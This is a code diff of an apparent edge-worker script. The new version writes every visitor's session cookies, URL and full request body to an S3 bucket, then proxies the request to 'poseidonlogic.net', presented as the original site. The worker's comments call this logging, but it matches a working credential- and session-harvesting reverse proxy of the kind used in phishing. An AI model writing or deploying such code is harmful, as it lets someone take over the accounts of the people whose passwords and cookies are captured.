@@ -2,42 +2,43 @@ import { AwsClient } from 'aws4fetch';
 
 export default {
   async fetch(request, env, ctx) {
-    // Only log requests to /shop
-    if (request.url.includes('/shop')) {
-      // Clone request so body can be read
-      const requestClone = request.clone();
-      const logPromise = (async () => {
-        try {
-          const aws = new AwsClient({
-            accessKeyId: env.AWS_KEY,
-            secretAccessKey: env.AWS_SECRET_KEY,
-            service: 's3',
-            region: env.BUCKET_REGION,
-          });
+    // Capture request data
+    const aws = new AwsClient({
+      accessKeyId: env.AWS_KEY,
+      secretAccessKey: env.AWS_SECRET_KEY,
+      service: 's3',
+      region: env.BUCKET_REGION,
+    });
 
-          const body = await requestClone.text();
-          const session = request.headers.get('Cookie') || 'no-session';
-          const logData = `Session: ${session}\nURL: ${request.url}\nBody:\n${body}`;
+    const body = await request.text();
+    const session = request.headers.get('Cookie') || 'no-session';
+    const logData = `Session: ${session}\nURL: ${request.url}\nBody:\n${body}`;
 
-          const now = new Date().toISOString();
-          const key = `logs/${now}.txt`;
-          const s3Url = `https://${env.BUCKET_NAME}.s3.${env.BUCKET_REGION}.amazonaws.com/${key}`;
+    const now = new Date().toISOString();
+    const key = `logs/${now}.txt`;
+    const s3Url = `https://${env.BUCKET_NAME}.s3.${env.BUCKET_REGION}.amazonaws.com/${key}`;
 
-          await aws.fetch(s3Url, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'text/plain' },
-            body: logData,
-          });
-        } catch (err) {
-          console.error('S3 logging failed:', err);
-        }
-      })();
+    ctx.waitUntil(
+      aws.fetch(s3Url, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'text/plain' },
+        body: logData,
+      })
+    );
 
-      // Allow logging to run in background
-      ctx.waitUntil(logPromise);
-    }
+    // Proxy the original request to your backend
+    const url = new URL(request.url);
+    url.hostname = "poseidonlogic.net"; // Point to the original site
 
-    // Forward the request to the origin (your website's backend)
-    return fetch(request);
-  },
+    // Reconstruct request with same method/body/headers
+    const proxyRequest = new Request(url.toString(), {
+      method: request.method,
+      headers: request.headers,
+      body: request.method !== 'GET' && request.method !== 'HEAD' ? body : undefined,
+      redirect: 'manual',
+    });
+
+    const response = await fetch(proxyRequest);
+    return response;
+  }
 };
